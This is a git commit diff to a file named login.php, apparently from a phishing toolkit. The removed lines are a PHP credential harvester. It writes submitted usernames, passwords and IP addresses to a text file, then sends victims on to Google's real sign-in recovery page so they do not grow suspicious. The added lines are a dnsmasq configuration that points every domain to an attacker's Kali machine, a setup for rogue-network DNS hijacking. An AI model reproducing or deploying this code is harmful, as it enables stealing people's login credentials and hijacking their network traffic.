3a5811359d076dcffb2052cb5f25a62e459b88fa
mitul37 <mitul.joarder@g.bracu.ac.bd>
2025-05-16 15:06:22 +0600

    Update login.php

--- login.php
+++ login.php
@@ -1,16 +1,5 @@
-<?php
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $username = $_POST['username'] ?? 'N/A';
-    $password = $_POST['password'] ?? 'N/A';
-    $ip       = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
-    $time     = date("Y-m-d H:i:s");
-
-    $log = "[{$time}] IP: {$ip} | Username: {$username} | Password: {$password}\n";
-
-    file_put_contents("usernames.txt", $log, FILE_APPEND | LOCK_EX);
-
-    // Optional: redirect to real site to avoid suspicion
-    header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
-    exit();
-}
-?>
+interface=wlan0                     # Replace with your interface (eth0 or wlan0)
+dhcp-range=192.168.0.50,192.168.0.150,12h
+address=/#/192.168.0.119            # Redirect ALL domains to your Kali IP
+log-queries
+log-dhcp
